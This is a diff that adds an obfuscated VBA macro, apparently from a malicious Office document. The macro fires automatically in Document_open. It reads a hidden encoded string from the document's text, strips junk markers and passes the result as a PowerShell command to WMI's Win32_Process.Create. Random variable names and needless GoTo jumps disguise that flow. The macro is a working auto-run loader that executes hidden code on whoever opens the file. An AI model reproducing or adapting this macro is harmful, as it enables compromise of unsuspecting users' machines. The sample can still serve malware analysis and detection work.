@@ -1,0 +1,83 @@
+Private Sub Document_open()
+Fze6qx44rw5aszbt
+End Sub
+
+Function Fze6qx44rw5aszbt()
+On Error Resume Next
+DecodedPowershell = Vfdikb_feuu5.StoryRanges.Item(4 / 4)
+   GoTo tQTFBqA
+
+tQTFBqA:
+snahbsd = "p"
+Fbv992qfhq27g = "rocess"
+   GoTo OVwmCAH
+
+OVwmCAH:
+Hvk0dsc_rhglwtwe_ = ":win32_"
+   GoTo AAeJaGPGG
+
+AAeJaGPGG:
+Inecdmlpu2qhdyuc7 = "winmgmt"
+   GoTo DOxnIH
+
+DOxnIH:
+Y4z7qexbw8vxsqeas = S
+   GoTo kxbTMAT
+
+kxbTMAT:
+   GoTo FVSMdJOIE
+
+FVSMdJOIE:
+Ivlw75dp09m52 = DecodeObjString("winmgmtS:win32_process")
+   GoTo FAoXC
+
+FAoXC:
+Set OLEObject = CreateObject(Ivlw75dp09m52)
+   GoTo tmyps
+
+tmyps:
+PowershellCommand = Mid(DecodedPowershell, (15 / 3), Len(DecodedPowershell))
+   GoTo QahYKdD
+
+QahYKdD:
+   GoTo mPpoGDcE
+
+mPpoGDcE:
+OLEObject.Create DecodeObjString(PowershellCommand), Null, Null
+   GoTo IpEoFII
+
+IpEoFII:
+   GoTo wMRKO
+
+wMRKO:
+End Function
+
+Function DecodeObjString(Uuui56wnyntzqh53_)
+On Error Resume Next
+   GoTo JSfIA
+
+JSfIA:
+Dr10lbgo5kz1j08f2f = (Uuui56wnyntzqh53_)
+   GoTo SgVgEGFI
+
+SgVgEGFI:
+Xegl8caxywu = DecodeObjString2(Dr10lbgo5kz1j08f2f)
+   GoTo ABAmiGj
+
+ABAmiGj:
+DecodeObjString = Xegl8caxywu
+   GoTo FFjgB
+
+FFjgB:
+End Function
+
+Function DecodeObjString2(Y2uwkl98llp5)
+
+   GoTo WVYONv
+
+WVYONv:
+DecodeObjString2 = Replace(Y2uwkl98llp5, "]e1r[S", Uzid_5bjvn3aycd)
+   GoTo OZnnI
+
+OZnnI:
+End Function
